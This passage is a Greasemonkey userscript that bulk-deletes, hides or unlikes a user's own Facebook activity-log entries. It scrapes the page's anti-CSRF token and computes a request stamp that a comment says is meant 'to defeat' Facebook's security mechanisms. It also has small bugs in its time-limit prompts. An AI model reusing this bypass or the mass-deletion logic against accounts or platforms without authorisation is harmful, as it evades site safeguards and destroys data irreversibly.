// ==UserScript==
// @name           Facebook Timeline Cleaner
// @namespace      TimeLine Cleaner..
// @include        http://www.facebook.com/*
// @include        https://www.facebook.com/*
// @require        http://code.jquery.com/jquery-1.8.3.min.js
// @version	1.0
// ==/UserScript==

var calledOnPage;
var debug=true;
var doDeleteActivity=false;
var doDeleteGamePosts=false;
var doHideAll=false;
var doUnlike=false;
var doDeleteAll=false;
var olderThan=0;
var youngerThan=0;
var expandCount = 0;
var expandLimit = true;
var isActivityLog=false;
var triggeredMap = {};
var handledMap = {};
var now = Math.round((new Date()).getTime() / 1000);
var actions = 0;
var delay = 2000; // in milliseconds

// Detect whether we are using http or https ( secure browsing )
if ("https:" == document.location.protocol) {
    var protocol = "https://";
	console.log("Detected that we're running with secure browsing..");
} else {
    var protocol = "http://";
	console.log("Detected that we're not running with secure browsing..");
}


unsafeWindow.console.log(console.log);

function parseUri (str) {
	var	o   = parseUri.options,
		m   = o.parser[o.strictMode ? "strict" : "loose"].exec(str),
		uri = {},
		i   = 14;

	while (i--) uri[o.key[i]] = m[i] || "";

	uri[o.q.name] = {};
	uri[o.key[12]].replace(o.q.parser, function ($0, $1, $2) {
		if ($1) uri[o.q.name][$1] = $2;
	});

	return uri;
};

parseUri.options = {
	strictMode: false,
	key: ["source","protocol","authority","userInfo","user","password","host","port","relative","path","directory","file","query","anchor"],
	q:   {
		name:   "queryKey",
		parser: /(?:^|&)([^&=]*)=?([^&]*)/g
	},
	parser: {
		strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
		loose:  /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
	}
};

				 						 		
// To defeat certain security mechanisms facebook implemented
var generatePhstamp = function(qs, dtsg) {
    var input_len = qs.length;
    numeric_csrf_value='';
    
    for(var ii=0;ii<dtsg.length;ii++) {
        numeric_csrf_value+=dtsg.charCodeAt(ii);
    }
    return '1' + numeric_csrf_value + input_len;
};

    
window.addEventListener('load', function()  {
	
	var fb_dtsg = null;

	// Get the value of fb_dtsg
	var getConstantParameters = function () {
		if ( fb_dtsg !== null ) {
			return true;
		} else {
			
			if ( fb_dtsg === null ) {
				$('input[name="fb_dtsg"]').each(function(){
					fb_dtsg = $(this).attr("value");
				});
			}
			return (fb_dtsg !== null);
		}
	}
	
	
	//Check if on activitylog
	function checkForActivityLog()
	{
		var temp = /(allactivity)/g;
		var result = temp.test( $(location).attr('href') );
		if (result != false)
		{
			isActivityLog=true;
			//if(debug) { console.log("Bin auf der richtigen Seite");}
		}
		else
		{
			//if(debug) { console.log("Bin NICHT auf der richtigen Seite");}
			isActivityLog=false;
		}
	}

	setTimeout (checkForActivityLog, 1000);
	

	//expand activitylog
	var expandMoreActivity = function () 
	{
		var links = $('a[onclick]'); 
		for (var i = 0; i < links.length; ++i) 
		{
			if ((( links[i].innerHTML === "More Activity") || ( links[i].innerHTML ==="Weitere Aktivitäten")) && isActivityLog) 
			{
				if(debug)
				{
					//console.log("Expanding");
				}
				links[i].click();			
			}
		}
	
		if ( !expandLimit || (expandLimit && expandCount >= 0) ) 
		{
			expandCount -= 1;
			setTimeout(expandMoreActivity, 1000);
			scrollTo(0, 10000000);
		}
		else
		{
			scrollTo(0, 0);
			handleStories();
		}
	}
	
	//show options of stories and do stuff
	var handleStories = function () {
 
        
		if (calledOnPage === document.URL)
		{
		
			getConstantParameters();
			
			if (youngerThan == 0){youngerThan=9999;}
			
			//$('li[class="pvs uiStreamMinistoryGroup timelineMinistoryGroup uiListItem uiListMedium uiListVerticalItemBorder"]').each( function() {
			//$('ul[class="uiList _4kg"]').each( function() {
			$('li').each( function() {
                
                var klasse= $(this).attr('class');
                if (typeof klasse != "undefined")
                {
                    if (klasse.indexOf("uiStreamStory uiUnifiedStory timelineLogStory") != -1)
                    {
                       
                            
						//var pagelet_all_activity = ministory.parent().attr('id').replace("timeline_all_activity_stream", "pagelet_all_activity");
                        var ministory = $(this);
						ministory.find('a.uiPopoverButton').each(function () {
								var evt = document.createEvent("MouseEvents");
								evt.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
								$(this).context.dispatchEvent(evt);
								$(this).context.dispatchEvent(evt);
								//$(this).click();
						});
                        
						//Aktivität?
						var isActivity=false;
						$(this).find('a[href]').each(function(){
							
							var myhref = parseUri(protocol+"facebook.com" + $(this).attr("href"));
							
							if (myhref.path.indexOf('/activity/')!=-1)
							{
								isActivity=true;
							}
                            
						});


						//Spielepost?
						var isGamePost=false;
						$(this).find('a[href]').each(function(){
							
							var myhref = parseUri(protocol+"facebook.com" + $(this).attr("href"));
							
							if (myhref.file === "application.php"){
								isGamePost=true;
							}
						});
				
                		$(".uiContextualLayerPositioner").find('a[ajaxify]').each(function () {
                            
							var ajaxify = parseUri(protocol+"facebook.com" + $(this).attr("ajaxify"));
                            //var ajaxify = parseUri((this).attr("ajaxify"));                          
							
							if ( ajaxify.file === "show_story_options.php" && triggeredMap[ajaxify.queryKey['story_dom_id']] === undefined)
							{
								var evt = document.createEvent("MouseEvents");
								evt.initMouseEvent("mouseover", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
								$(this).context.dispatchEvent(evt);
								triggeredMap[ajaxify.queryKey['story_dom_id']] = true;
								if(debug){console.log("Story Action expanded: "+ ajaxify.queryKey['story_fbid']);}
							}
							else if (ajaxify.file === "take_action_on_story.php" && handledMap[ajaxify.queryKey['story_dom_id']] === undefined)
							{
								if ((ajaxify.queryKey['action'] === 'remove_content' || ajaxify.queryKey['action'] === 'remove_comment') && ((doDeleteActivity && isActivity) || (doDeleteGamePosts && isGamePost) || doDeleteAll) && ((now-ajaxify.queryKey['story_row_time']) > olderThan*60*60) && ((now-ajaxify.queryKey['story_row_time']) < youngerThan*24*60*60) && isActivityLog) 
								{
									if(debug){console.log("Deleting: "+ ajaxify.queryKey['story_fbid']);}
									
									var data = {
										'fb_dtsg'			  : fb_dtsg,
										'post_form_id_source' : "AsyncRequest",
										'confirmed'			  : "true",
										'ban_user'			  : "0"
									};							

									for ( var key in ajaxify.queryKey ) 
									{
										data[key] = ajaxify.queryKey[key];
									}
                                    actions++;
                                    setTimeout(function() {remove(ministory, data);},delay*actions);
									handledMap[ajaxify.queryKey['story_dom_id']] = true;
								}
								else if (ajaxify.queryKey['action'] === 'unlike' && doUnlike)
								{
									if(debug){console.log("Unlike: "+ ajaxify.queryKey['story_fbid']);}
									
									var data = {
										'fb_dtsg'			  : fb_dtsg,
										'post_form_id_source' : "AsyncRequest",
										'confirmed'			  : "true",
										'ban_user'			  : "0"
									};
                                    data['phstamp'] = generatePhstamp($.param(data), fb_dtsg);
									for ( var key in ajaxify.queryKey ) 
									{
										data[key] = ajaxify.queryKey[key];
									}
                                    actions++;
                                    setTimeout(function() {remove(ministory, data);},delay*actions);
									handledMap[ajaxify.queryKey['story_dom_id']] = true;
								}
							}
							else if (ajaxify.file === "story_visibility.php"  && handledMap[ajaxify.queryKey['story_dom_id']] === undefined)
							{
								if (ajaxify.queryKey['action'] == 'hide' && doHideAll && ((now-ajaxify.queryKey['story_row_time']) > olderThan*60*60) && ((now-ajaxify.queryKey['story_row_time']) < youngerThan*24*60*60) && isActivityLog)
								{
									if(debug){console.log("Hiding: "+ajaxify.queryKey['story_fbid']);}
								
									var data = {
										'fb_dtsg'			  : fb_dtsg,
										'post_form_id_source' : "AsyncRequest",
										'confirmed'			  : "true",
										'ban_user'			  : "0"
									};
                                    data['phstamp'] = generatePhstamp($.param(data), fb_dtsg);
									for ( var key in ajaxify.queryKey ) 
									{
										data[key] = ajaxify.queryKey[key];
									}
                                    actions++;
                                    setTimeout(function() {hide(ministory, data);},delay*actions);
									handledMap[ajaxify.queryKey['story_dom_id']] = true;
								}
							}						
						});
						
                    }
                }

			});
			if (isActivityLog) {setTimeout(handleStories,2000);}
		}
	}
	
	
// Convert a hash to a query string for posting
	var toQueryString = function(o) {
	    if(typeof o !== 'object') {
	        return false;
	    }
	    var _p, _qs = [];
	    for(_p in o) {
	        _qs.push(encodeURIComponent(_p) + '=' + encodeURIComponent(o[_p]));
	    }
	    return _qs.join('&');
	};


	function remove(myministory, mydata)
	{

		$.browser.chrome = /chrome/.test(navigator.userAgent.toLowerCase()); 
			console.log("Chrome detected.. using jquery ajax call..");
		if($.browser.chrome){
			$.ajax({
				type    : "POST",
				url     : "http://www.facebook.com/ajax/timeline/take_action_on_story.php?",
				data    : mydata,
				complete: function(jqXHR, textStatus) {
					if ( jqXHR.status === 200 ) {
						if ( $('#tlcleanmenu').attr('deletecount') === undefined || $('#tlcleanmenu').attr('deletecount') === null ) {
							$('#tlcleanmenu').attr('deletecount', '0');
						}
						var deleteCount = parseInt($('#tlcleanmenu').attr('deletecount')) + 1;
						if (document.documentElement.lang === "de")
						{
							$('#tlcleanmenu').html('<span class="uiButtonText"><font size="-5">Chronikaufräumer (' + deleteCount + ')</font></span>');
						}
						else
						{
							$('#tlcleanmenu').html('<span class="uiButtonText"><font size="-5">Clear Timeline (' + deleteCount + ')</font></span>');
						}
						$('#tlcleanmenu').attr('deletecount', '' + deleteCount);
						myministory.remove();
						if (debug){console.log("Deleted: " + mydata['story_fbid']);}
						
					}
					else if ( jqXHR.status === 500 )
					{
						//console.log("Error " + jqXHR.status + " on Story " + mydata['story_fbid'] + ", retrying");
						//setTimeout(function(){remove(myministory,mydata)},1000);
						console.log("Error removing content.. skipping, sorry.. I tried :(");
						myministory.remove(); 

					}
					else
					{
						if (debug){console.log("Error " + jqXHR.status + " on Story " + mydata['story_fbid']);}
					}
				}
			});
		} else {
			console.log("Firefox detected.. using GM_xmlhttpRequest ajax call..");
			GM_xmlhttpRequest({
			  method: "POST",
			  url     : protocol+"facebook.com/ajax/timeline/take_action_on_story.php?",
			  data: toQueryString(mydata),
			  dataType : 'text',
			  headers: {
					'Content-Type'    : 'application/x-www-form-urlencoded; charset=UTF-8',
					'Referer'         : document.location,
					'Cookie'          : document.cookie,
			  },
			  onload: function(response) {
				  console.log(response.responseText);
				if ( response.status === 200 ) {
					
					if ( $('#tlcleanmenu').attr('deletecount') === undefined || $('#tlcleanmenu').attr('deletecount') === null ) {
						$('#tlcleanmenu').attr('deletecount', '0');
					}
					var deleteCount = parseInt($('#tlcleanmenu').attr('deletecount')) + 1;
					if (document.documentElement.lang === "de")
					{
						$('#tlcleanmenu').html('<span class="uiButtonText"><font size="-5">Chronikaufräumer (' + deleteCount + ')</font></span>');
					}
					else
					{
						$('#tlcleanmenu').html('<span class="uiButtonText"><font size="-5">Clear Timeline (' + deleteCount + ')</font></span>');
					}
					$('#tlcleanmenu').attr('deletecount', '' + deleteCount);
				
					myministory.remove();
					if (debug){console.log("Deleted: " + mydata['story_fbid']);}
					
				}
				else if ( response.status === 500 )
				{
					//console.log("Error " + response.status + " on Story " + mydata['story_fbid'] + ", retrying");
					//setTimeout(function(){remove(myministory,mydata)},1000);
					console.log("Error removing content.. skipping, sorry.. I tried :(");
					myministory.remove(); 
				}
				else
				{
					if (debug){console.log("Error " + response.status + " on Story " + mydata['story_fbid']);}
				}
			  }
			});
		}

	}	
	
	function hide(myministory, mydata)
	{

		$.browser.chrome = /chrome/.test(navigator.userAgent.toLowerCase()); 

		if($.browser.chrome){
			console.log("Chrome detected.. using jquery ajax call..");
			$.ajax({
				type    : "POST",
				url     : "http://www.facebook.com/ajax/timeline/story_visibility.php?",
				data    : mydata,
				complete: function(jqXHR, textStatus) {
					if ( jqXHR.status === 200 ) {
						if ( $('#tlcleanmenu').attr('deletecount') === undefined || $('#tlcleanmenu').attr('deletecount') === null ) {
							$('#tlcleanmenu').attr('deletecount', '0');
						}
						var deleteCount = parseInt($('#tlcleanmenu').attr('deletecount')) + 1;
						if (document.documentElement.lang === "de")
						{
							$('#tlcleanmenu').html('<span class="uiButtonText"><font size="-5">Chronikaufräumer (' + deleteCount + ')</font></span>');
						}
						else
						{
							$('#tlcleanmenu').html('<span class="uiButtonText"><font size="-5">Clear Timeline (' + deleteCount + ')</font></span>');
						}
						$('#tlcleanmenu').attr('deletecount', '' + deleteCount);
						myministory.remove();
						if (debug){console.log("Hidden: " + mydata['story_fbid']);}
					}
					else if ( jqXHR.status === 500 )
					{
						//console.log("Error " + jqXHR.status + " on Story " + mydata['story_fbid'] + ", retrying");
						//setTimeout(function(){hide(myministory,mydata)},1000);
						console.log("Error removing content.. skipping, sorry.. I tried :(");
						myministory.remove(); 
					}
					else
					{
						if (debug){console.log("Error " + jqXHR.status + " on Story " + mydata['story_fbid']);}
					}
				}
			});
		} else {
			console.log("Firefox detected.. using GM_xmlhttpRequest ajax call..");
			GM_xmlhttpRequest({
			  method: "POST",
			  url     :  protocol+"facebook.com/ajax/timeline/story_visibility.php?",
			  data: toQueryString(mydata),
			  dataType : 'text',
			  headers: {
					'Content-Type'    : 'application/x-www-form-urlencoded; charset=UTF-8',
					'Referer'         : document.location,
					'Cookie'          : document.cookie,
			  },
			  onload: function(response) {
				  console.log(response.responseText);
				if ( response.status === 200 ) {
					
					if ( $('#tlcleanmenu').attr('deletecount') === undefined || $('#tlcleanmenu').attr('deletecount') === null ) {
						$('#tlcleanmenu').attr('deletecount', '0');
					}
					var deleteCount = parseInt($('#tlcleanmenu').attr('deletecount')) + 1;
					if (document.documentElement.lang === "de")
					{
						$('#tlcleanmenu').html('<span class="uiButtonText"><font size="-5">Chronikaufräumer (' + deleteCount + ')</font></span>');
					}
					else
					{
						$('#tlcleanmenu').html('<span class="uiButtonText"><font size="-5">Clear Timeline (' + deleteCount + ')</font></span>');
					}
					$('#tlcleanmenu').attr('deletecount', '' + deleteCount);
				
					myministory.remove();
					if (debug){console.log("Deleted: " + mydata['story_fbid']);}
					
				}
				else if ( response.status === 500 )
				{
					//console.log("Error " + response.status + " on Story " + mydata['story_fbid'] + ", retrying");
					//setTimeout(function(){remove(myministory,mydata)},1000);
					console.log("Error removing content.. skipping, sorry.. I tried :(");
					myministory.remove(); 
				}
				else
				{
					if (debug){console.log("Error " + response.status + " on Story " + mydata['story_fbid']);}
				}
			  }
			});
		}

	}
	

	function addButton()
	{
        if (isActivityLog==true)
        {
            insert_button=true;
            if (document.documentElement.lang === "de")
            {
                //$('span[class="uiButtonGroup fbStickyHeaderBreadcrumb uiButtonGroupOverlay"]').append('<span class="uiButtonGroupItem selectorItem"><div class="uiSelector inlineBlock sectionMenu uiSelectorNormal"><div class="wrap "><button class="hideToggler"></button><a id="tlcleanmenu" rel="toggle" data-length="500" aria-haspopup="1" href="#" role="button" class="uiSelectorButton uiButton uiButtonOverlay "><span class="uiButtonText"><font size="-1">Chronikaufräumer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></span></a><div class="uiSelectorMenuWrapper uiToggleFlyout"><div class="uiMenu uiSelectorMenu" role="menu"><ul class="uiMenuInner"><li id="menuItem1" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Alle Aktivitäten in bestimmtem Zeitfenster löschen</span></a></li><li id="menuItem2" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" id="menu2" tabindex="0"><span class="itemLabel fsm">Alle Spieleposts in bestimmtem Zeitfenster löschen</span></a></li><li id="menuItem3" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" id="menu3" tabindex="0"><span class="itemLabel fsm">Alles in bestimmtem Zeitfenster verstecken</span></a></li><li id="menuItem4" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">ALLES in bestimmtem Zeitfenster löschen</span></a></li><li><HR WIDTH="50"></li><li id="menuItem5" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Alle Aktivitäten löschen</span></a></li><li id="menuItem6" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Alle Spieleposts löschen</span></a></li><li id="menuItem7" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Alles in der Chronik verstecken</span></a></li><li id="menuItem8" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Alles "unliken"</span></a></li><li id="menuItem9" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">ALLES löschen</span></a></li></ul></div></div><button class="hideToggler"></button></div><select id="selectvalue"><option value=""></option><option value="DeleteActivityOlder"></option><option value="DeleteGamePostOlder"></option><option value="HideOlder"></option><option value="DeleteOlder"></option><option value="DeleteActivity" ></option><option value="DeleteGamePost" ></option><option value="Hide" ></option><option value="Unlike" ></option><option value="Delete" ></option></select></div></span>');
                $('ul[class="uiSideNav"]:first').append('<span class="uiButtonGroupItem selectorItem"><div class="uiSelector inlineBlock sectionMenu uiSelectorNormal"><div class="wrap "><button class="hideToggler"></button><a id="tlcleanmenu" rel="toggle" data-length="500" aria-haspopup="1" href="#" role="button" class="uiSelectorButton uiButton uiButtonOverlay "><span class="uiButtonText"><font size="-1">Chronikaufräumer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></span></a><div class="uiSelectorMenuWrapper uiToggleFlyout"><div class="uiMenu uiSelectorMenu" role="menu"><ul class="uiMenuInner"><li id="menuItem1" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Alle Aktivitäten in bestimmtem Zeitfenster löschen</span></a></li><li id="menuItem2" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" id="menu2" tabindex="0"><span class="itemLabel fsm">Alle Spieleposts in bestimmtem Zeitfenster löschen</span></a></li><li id="menuItem3" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" id="menu3" tabindex="0"><span class="itemLabel fsm">Alles in bestimmtem Zeitfenster verstecken</span></a></li><li id="menuItem4" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">ALLES in bestimmtem Zeitfenster löschen</span></a></li><li><HR WIDTH="50"></li><li id="menuItem5" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Alle Aktivitäten löschen</span></a></li><li id="menuItem6" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Alle Spieleposts löschen</span></a></li><li id="menuItem7" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Alles in der Chronik verstecken</span></a></li><li id="menuItem8" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Alles "unliken"</span></a></li><li id="menuItem9" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">ALLES löschen</span></a></li></ul></div></div><button class="hideToggler"></button></div><select id="selectvalue"><option value=""></option><option value="DeleteActivityOlder"></option><option value="DeleteGamePostOlder"></option><option value="HideOlder"></option><option value="DeleteOlder"></option><option value="DeleteActivity" ></option><option value="DeleteGamePost" ></option><option value="Hide" ></option><option value="Unlike" ></option><option value="Delete" ></option></select></div></span>');
    
            }
            else
            {
                //$('span[class="uiButtonGroup fbStickyHeaderBreadcrumb uiButtonGroupOverlay"]').append('<span class="uiButtonGroupItem selectorItem"><div class="uiSelector inlineBlock sectionMenu uiSelectorNormal"><div class="wrap "><button class="hideToggler"></button><a id="tlcleanmenu" rel="toggle" data-length="500" aria-haspopup="1" href="#" role="button" class="uiSelectorButton uiButton uiButtonOverlay "><span class="uiButtonText"><font size="-1">Clear Timeline&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></span></a><div class="uiSelectorMenuWrapper uiToggleFlyout"><div class="uiMenu uiSelectorMenu" role="menu"><ul class="uiMenuInner"><li id="menuItem1" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Delete all activities in a selected timeframe</span></a></li><li id="menuItem2" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" id="menu2" tabindex="0"><span class="itemLabel fsm">Delete all gameposts in a selected timeframe</span></a></li><li id="menuItem3" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" id="menu3" tabindex="0"><span class="itemLabel fsm">Hide everything in a selected timeframe</span></a></li><li id="menuItem4" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Delete EVERYTHING in a selected timeframe</span></a></li><li><HR WIDTH="50"></li><li id="menuItem5" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Delete all activities</span></a></li><li id="menuItem6" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Delete all gameposts</span></a></li><li id="menuItem7" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Hide everything</span></a></li><li id="menuItem8" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">"Unlike" everything</span></a></li><li id="menuItem9" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Delete EVERYTHING</span></a></li></ul></div></div><button class="hideToggler"></button></div><select id="selectvalue"><option value=""></option><option value="DeleteActivityOlder"></option><option value="DeleteGamePostOlder"></option><option value="HideOlder"></option><option value="DeleteOlder"></option><option value="DeleteActivity" ></option><option value="DeleteGamePost" ></option><option value="Hide" ></option><option value="Unlike" ></option><option value="Delete" ></option></select></div></span>');
                $('ul[class="uiSideNav"]:first').append('<span class="uiButtonGroupItem selectorItem"><div class="uiSelector inlineBlock sectionMenu uiSelectorNormal"><div class="wrap "><button class="hideToggler"></button><a id="tlcleanmenu" rel="toggle" data-length="500" aria-haspopup="1" href="#" role="button" class="uiSelectorButton uiButton uiButtonOverlay "><span class="uiButtonText"><font size="-1">Clear Timeline&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></span></a><div class="uiSelectorMenuWrapper uiToggleFlyout"><div class="uiMenu uiSelectorMenu" role="menu"><ul class="uiMenuInner"><li id="menuItem1" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Delete all activities in a selected timeframe</span></a></li><li id="menuItem2" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" id="menu2" tabindex="0"><span class="itemLabel fsm">Delete all gameposts in a selected timeframe</span></a></li><li id="menuItem3" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" id="menu3" tabindex="0"><span class="itemLabel fsm">Hide everything in a selected timeframe</span></a></li><li id="menuItem4" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Delete EVERYTHING in a selected timeframe</span></a></li><li><HR WIDTH="50"></li><li id="menuItem5" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Delete all activities</span></a></li><li id="menuItem6" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Delete all gameposts</span></a></li><li id="menuItem7" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Hide everything</span></a></li><li id="menuItem8" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">"Unlike" everything</span></a></li><li id="menuItem9" class="uiMenuItem uiSelectorOption"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"><span class="itemLabel fsm">Delete EVERYTHING</span></a></li></ul></div></div><button class="hideToggler"></button></div><select id="selectvalue"><option value=""></option><option value="DeleteActivityOlder"></option><option value="DeleteGamePostOlder"></option><option value="HideOlder"></option><option value="DeleteOlder"></option><option value="DeleteActivity" ></option><option value="DeleteGamePost" ></option><option value="Hide" ></option><option value="Unlike" ></option><option value="Delete" ></option></select></div></span>');
            }
        }
	}
	addButton();		



	function checkForCommand()
	{
		checkForActivityLog();
		//console.log($(location).attr('href'));
		if (isActivityLog==true)
		{
		
			if(document.getElementById("selectvalue"))
			{
				var selected=document.getElementById("selectvalue").options[document.getElementById("selectvalue").selectedIndex].value;

				if (debug) {console.log('Checking for command');}

				if(selected!="")
				{
					calledOnPage=document.URL;

					switch (selected) 
					{

						case "DeleteActivityOlder":
							doDeleteActivity=true;
							doDeleteGamePosts=false;
							doHideAll=false;
							doUnlike=false;
							doDeleteAll=false;
							olderThan = 0;
							if (document.documentElement.lang === "de")
							{
								olderThan = prompt("Alle Spieleaktivitäten älter als ? Stunden löschen",olderThan);
							}
							else
							{
								olderThan = prompt("Delete all activities older than ? hours",olderThan);
							}
							if (document.documentElement.lang === "de")
							{
								youngerThan = prompt("Alle Spieleaktivitäten jünger als ? Tage löschen (0 = No limit)",0);
							}
							else
							{
								olderThan = prompt("Delete all activities younger than ? days (0 = No limit)",0);
							}
							if(parseInt(olderThan)>=0 && parseInt(youngerThan)>=0)
							{
								expandMoreActivity ();
							}
							break;
		 
						case "DeleteGamePostOlder": 
							doDeleteActivity=false;
							doDeleteGamePosts=true;
							doHideAll=false;
							doUnlike=false;
							doDeleteAll=false;
							olderThan = 0;
							if (document.documentElement.lang === "de")
							{
								olderThan = prompt("Alle Spieleposts älter als ? Stunden löschen",olderThan);
							}
							else
							{
								olderThan = prompt("Delete all gameposts older than ? hours",olderThan);
							}
							if (document.documentElement.lang === "de")
							{
								youngerThan = prompt("Alle Spieleposts jünger als ? Tage löschen (0 = No limit)",0);
							}
							else
							{
								youngerThan = prompt("Delete all gameposts younger than ? days (0 = No limit)",0);
							}
							
							if(parseInt(olderThan)>=0 && parseInt(youngerThan)>=0)
							{
								expandMoreActivity ();
							}
							break;
						case "HideOlder":
							doDeleteActivity=false;
							doDeleteGamePosts=false;
							doHideAll=true;
							doUnlike=false;
							doDeleteAll=false;
							olderThan = 0;
							if (document.documentElement.lang === "de")
							{
								olderThan = prompt("ALLES älter als ? Stunden verstecken",olderThan);
							}
							else
							{
								olderThan = prompt("Hide everything older than ? hours",olderThan);
							}		
							if (document.documentElement.lang === "de")
							{
								youngerThan = prompt("ALLES jünger als ? Tage verstecken (0 = No limit)",0);
							}
							else
							{
								youngerThan = prompt("Hide everything younger than ? days (0 = No limit)",0);
							}					
							
							if(parseInt(olderThan)>=0 && parseInt(youngerThan)>=0)
							{
								expandMoreActivity ();
							}
							break;
						case "DeleteOlder":
							doDeleteActivity=false;
							doDeleteGamePosts=false;
							doHideAll=false;
							doUnlike=false;
							doDeleteAll=true;
							olderThan = 0;
							if (document.documentElement.lang === "de")
							{
								olderThan = prompt("ALLES älter als ? Stunden löschen",olderThan);
							}
							else
							{
								olderThan = prompt("Delete everything older than ? hours",olderThan);
							}
							if (document.documentElement.lang === "de")
							{
								youngerThan = prompt("ALLES jünger als ? Tage löschen (0 = No limit)",0);
							}
							else
							{
								youngerThan = prompt("Delete everything younger than ? days (0 = No limit)",0);
							}						
							
							if(parseInt(olderThan)>=0 && parseInt(youngerThan)>=0)
							{
								expandMoreActivity ();
							}
							break;
						case "DeleteActivity":
							doDeleteActivity=true;
							doDeleteGamePosts=false;
							doHideAll=false;
							doUnlike=false;
							doDeleteAll=false;
							olderThan = 0;
							expandMoreActivity ();
							break;
						case "DeleteGamePost": 
							doDeleteActivity=false;
							doDeleteGamePosts=true;
							doHideAll=false;
							doUnlike=false;
							doDeleteAll=false;
							olderThan = 0;
							expandMoreActivity ();
							break;					
						case "Unlike":
							doDeleteActivity=false;
							doDeleteGamePosts=false;
							doHideAll=false;
							doDeleteAll=false;
							doUnlike=true;
							olderThan = 0;
							expandMoreActivity ();
							break;	
						case "Hide":
							doDeleteActivity=false;
							doDeleteGamePosts=false;
							doHideAll=true;
							doUnlike=false;
							doDeleteAll=false;
							olderThan = 0;
							expandMoreActivity ();
							break;					
						case "Delete":
							doDeleteActivity=false;
							doDeleteGamePosts=false;
							doHideAll=false;
							doUnlike=false;
							doDeleteAll=true;
							olderThan = 0;
							if (document.documentElement.lang === "de")
							{
								var answer = confirm("Wirklich ALLE Posts, Kommentare und Aktivitäten löschen?")
							}
							else
							{
								var answer = confirm("Really delete ALL posts, comments and activities?")
							}	
							
							if (answer) {expandMoreActivity ();}
							break;
					}

					document.getElementById('selectvalue').value = '';
					document.getElementById("menuItem1").setAttribute("class", "uiMenuItem uiSelectorOption");
					document.getElementById("menuItem2").setAttribute("class", "uiMenuItem uiSelectorOption");
					document.getElementById("menuItem3").setAttribute("class", "uiMenuItem uiSelectorOption");
					document.getElementById("menuItem4").setAttribute("class", "uiMenuItem uiSelectorOption");
